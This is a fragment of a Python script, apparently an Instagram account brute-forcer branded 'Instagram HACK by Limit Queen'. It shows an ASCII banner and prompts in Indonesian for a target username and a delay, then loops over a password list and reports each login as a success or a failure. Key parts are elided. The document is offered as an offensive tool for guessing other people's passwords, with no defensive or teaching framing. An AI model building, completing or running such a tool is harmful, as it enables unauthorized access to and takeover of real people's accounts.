...
print ("\33[31;1m _                                                       ")
time.sleep(0.3)
print ("\33[31;1m| |           _ _ _ _   _                                ")                                                         
time.sleep(0.3)
print ("\33[31;1m| | _ _ _ _  |  _ _ _| | |          _ _                  ")                                                                 
time.sleep(0.3)
print ("\33[31;1m| ||  _ _  | | |_ _ _  | |_ _      /   \                 ")                                                                     
time.sleep(0.3)
print ("\33[31;1m| || |   | | |_ _ _  | |  _ _|    /     \                ")                                                                          
time.sleep(0.3)
print ("\33[31;1m| || |   | |  _ _ _| | | |_ _ _  |  /_\  |               ")                                                                    
time.sleep(0.3)
print ("\33[31;1m|_||_|   |_| |_ _ _ _| |_ _ _ _| |_|   |_|  gram HACK by Limit Queen   ")
time.sleep(0.3)                                                                                           
...
instabrute = Instabrute(Input('\33[32;1m masukan username target : '))

try:
	delayLoop = int(Input('\33[36;1m [*] crack time (in seconds): ')) 
except Exception as e:
...
for password in instabrute.passwords:
	...
	if sess:
		print ('\33[32;1m[*] Login success %s' % [instabrute.username,password])
	else:
		print ('\33[31;1m[*] Password incorrect [%s]' % password)
